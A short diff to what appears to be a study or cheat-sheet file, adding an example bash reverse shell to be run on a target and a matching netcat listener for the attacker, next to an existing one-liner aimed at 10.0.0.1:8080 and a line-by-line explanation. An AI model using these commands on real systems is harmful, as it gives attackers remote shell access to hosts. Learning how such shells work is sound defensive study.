@@ -2346,6 +2346,11 @@ choices:
 
 reverse shell:
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+===
+reverse shell:
+on target: bash -i >& /dev/tcp/localhost/8080 0>&1
+on attacker:  nc -v -C -l localhost 8080
+now the attacker has a connection to the target
 
 The command bash -i >& invokes bash with an “interactive” option. Then /dev/tcp/10.0.0.1/8080
 redirects that session to a tcp socket via device file.  Finally 0>&1 Takes standard output, and
